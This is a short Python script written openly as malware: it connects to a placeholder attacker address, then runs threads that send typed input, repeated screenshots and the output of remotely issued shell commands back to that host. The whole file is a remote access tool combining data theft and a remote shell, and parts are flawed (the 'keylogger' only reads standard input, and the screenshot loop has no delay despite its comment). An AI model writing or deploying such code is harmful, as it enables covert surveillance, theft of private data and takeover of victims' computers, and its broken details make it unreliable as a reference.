import socket
import subprocess
import os
import threading
import time

# Create a socket object
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the attacker's server
sock.connect(("attacker_ip", 12345))

# Send a message to the attacker indicating that the malware is active
sock.send(b"Malware active")

def keylogger():
    # Create a log file to store keystrokes
    log_file = "keylog.txt"

    while True:
        # Get the current keystroke
        keystroke = input()

        # Write the keystroke to the log file
        with open(log_file, "a") as f:
            f.write(keystroke + "\n")

        # Send the keystroke to the attacker's server
        sock.send(keystroke.encode())

def screenshooter():
    # Take a screenshot every 5 minutes
    while True:
        # Take a screenshot using the Pillow library
        from PIL import ImageGrab
        img = ImageGrab.grab()
        img.save("screenshot.png")

        # Send the screenshot to the attacker's server
        with open("screenshot.png", "rb") as f:
            sock.send(f.read())

def command_executor():
    while True:
        # Receive commands from the attacker's server
        command = sock.recv(1024).decode()

        if command == "exit":
            # Close the connection and exit the malware
            sock.close()
            break

        # Execute the command and send the output to the attacker's server
        output = subprocess.check_output(command, shell=True)
        sock.send(output)

# Create threads for each function
keylog_thread = threading.Thread(target=keylogger)
screenshooter_thread = threading.Thread(target=screenshooter)
command_executor_thread = threading.Thread(target=command_executor)

# Start each thread
keylog_thread.start()
screenshooter_thread.start()
command_executor_thread.start()

while True:
    time.sleep(1)
